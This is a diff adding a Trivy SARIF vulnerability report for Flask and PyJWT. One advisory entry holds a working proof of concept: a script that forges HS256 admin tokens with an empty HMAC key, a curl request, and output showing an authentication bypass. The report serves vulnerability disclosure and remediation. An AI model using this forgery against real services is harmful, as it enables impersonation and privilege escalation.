@@ -1,0 +1,1212 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Trivy Vulnerability Scanner",
+          "informationUri": "https://github.com/aquasecurity/trivy",
+          "name": "Trivy",
+          "rules": [
+            {
+              "id": "CVE-2023-30861",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "flask: Possible disclosure of permanent session cookie due to missing Vary: Cookie header"
+              },
+              "fullDescription": {
+                "text": "Flask is a lightweight WSGI web application framework. When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by the proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session and the proxy's behavior regarding cookies. The risk depends on all these conditions being met.\n\n1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.\n2. The application sets `session.permanent = True`\n3. The application does not access or modify the session at any point during a request.\n4. `SESSION_REFRESH_EACH_REQUEST` enabled (the default).\n5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.\n\nThis happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified. This issue has been fixed in versions 2.3.2 and 2.2.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2023-30861",
+              "help": {
+                "text": "Vulnerability CVE-2023-30861\nSeverity: HIGH\nPackage: Flask\nFixed Version: 2.3.2, 2.2.5\nLink: [CVE-2023-30861](https://avd.aquasec.com/nvd/cve-2023-30861)\nFlask is a lightweight WSGI web application framework. When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by the proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session and the proxy's behavior regarding cookies. The risk depends on all these conditions being met.\n\n1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.\n2. The application sets `session.permanent = True`\n3. The application does not access or modify the session at any point during a request.\n4. `SESSION_REFRESH_EACH_REQUEST` enabled (the default).\n5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.\n\nThis happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified. This issue has been fixed in versions 2.3.2 and 2.2.5.",
+                "markdown": "**Vulnerability CVE-2023-30861**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|Flask|2.3.2, 2.2.5|[CVE-2023-30861](https://avd.aquasec.com/nvd/cve-2023-30861)|\n\nFlask is a lightweight WSGI web application framework. When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by the proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session and the proxy's behavior regarding cookies. The risk depends on all these conditions being met.\n\n1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.\n2. The application sets `session.permanent = True`\n3. The application does not access or modify the session at any point during a request.\n4. `SESSION_REFRESH_EACH_REQUEST` enabled (the default).\n5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.\n\nThis happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified. This issue has been fixed in versions 2.3.2 and 2.2.5."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "cvssv40_baseScore": 8.7,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-102268",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "pyjwt: PyJWT: Authentication bypass via improper public key validation"
+              },
+              "fullDescription": {
+                "text": "PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-102268",
+              "help": {
+                "text": "Vulnerability CVE-2026-102268\nSeverity: CRITICAL\nPackage: PyJWT\nFixed Version: 2.14.0\nLink: [CVE-2026-102268](https://avd.aquasec.com/nvd/cve-2026-102268)\nPyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.",
+                "markdown": "**Vulnerability CVE-2026-102268**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|CRITICAL|PyJWT|2.14.0|[CVE-2026-102268](https://avd.aquasec.com/nvd/cve-2026-102268)|\n\nPyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 9.1,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "9.1",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2022-29217",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-jwt: Key confusion through non-blocklisted public key formats"
+              },
+              "fullDescription": {
+                "text": "PyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2022-29217",
+              "help": {
+                "text": "Vulnerability CVE-2022-29217\nSeverity: HIGH\nPackage: PyJWT\nFixed Version: 2.4.0\nLink: [CVE-2022-29217](https://avd.aquasec.com/nvd/cve-2022-29217)\nPyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.",
+                "markdown": "**Vulnerability CVE-2022-29217**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|PyJWT|2.4.0|[CVE-2022-29217](https://avd.aquasec.com/nvd/cve-2022-29217)|\n\nPyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-102267",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "pyjwt: pyjwt: Verification key substitution via unvalidated JWKS redirects"
+              },
+              "fullDescription": {
+                "text": "PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-102267",
+              "help": {
+                "text": "Vulnerability CVE-2026-102267\nSeverity: HIGH\nPackage: PyJWT\nFixed Version: 2.14.0\nLink: [CVE-2026-102267](https://avd.aquasec.com/nvd/cve-2026-102267)\nPyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0.",
+                "markdown": "**Vulnerability CVE-2026-102267**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|PyJWT|2.14.0|[CVE-2026-102267](https://avd.aquasec.com/nvd/cve-2026-102267)|\n\nPyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-32597",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "pyjwt: PyJWT accepts unknown `crit` header extensions (RFC 7515 §4.1.11 MUST violation)"
+              },
+              "fullDescription": {
+                "text": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-32597",
+              "help": {
+                "text": "Vulnerability CVE-2026-32597\nSeverity: HIGH\nPackage: PyJWT\nFixed Version: 2.12.0\nLink: [CVE-2026-32597](https://avd.aquasec.com/nvd/cve-2026-32597)\nPyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.",
+                "markdown": "**Vulnerability CVE-2026-32597**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|PyJWT|2.12.0|[CVE-2026-32597](https://avd.aquasec.com/nvd/cve-2026-32597)|\n\nPyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-48526",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-pyjwt: PyJWT: Authentication bypass due to forged JSON Web Tokens"
+              },
+              "fullDescription": {
+                "text": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-48526",
+              "help": {
+                "text": "Vulnerability CVE-2026-48526\nSeverity: HIGH\nPackage: PyJWT\nFixed Version: 2.13.0\nLink: [CVE-2026-48526](https://avd.aquasec.com/nvd/cve-2026-48526)\nPyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.",
+                "markdown": "**Vulnerability CVE-2026-48526**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|PyJWT|2.13.0|[CVE-2026-48526](https://avd.aquasec.com/nvd/cve-2026-48526)|\n\nPyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-pxh4-856f-4h89",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery"
+              },
+              "fullDescription": {
+                "text": "### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-pxh4-856f-4h89",
+              "help": {
